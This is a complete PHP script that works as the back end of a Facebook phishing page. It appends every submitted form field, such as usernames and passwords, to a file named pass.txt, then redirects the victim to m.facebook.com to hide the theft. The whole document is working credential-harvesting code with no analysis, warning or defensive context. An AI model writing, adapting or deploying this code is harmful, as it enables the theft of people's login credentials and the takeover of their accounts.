<?php
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) 
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\n");
}
fwrite($handle, "\n\n\n");
fclose($handle);
header ('Location: https://m.facebook.com');
exit;
?>